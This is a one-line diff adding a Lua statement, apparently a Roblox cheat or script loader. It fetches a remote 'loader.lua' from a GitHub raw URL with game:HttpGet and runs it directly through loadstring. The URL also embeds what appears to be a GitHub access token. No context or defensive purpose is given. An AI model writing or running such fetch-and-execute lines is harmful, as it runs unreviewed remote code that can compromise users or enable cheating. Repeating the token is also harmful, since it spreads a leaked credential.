@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/emulationtag-debug/hauntizloader/refs/heads/main/loader.lua?token=GHSAT0AAAAAAD4BW7THQYVGCSBL3WY6EVWA2TRBL5Q"))()
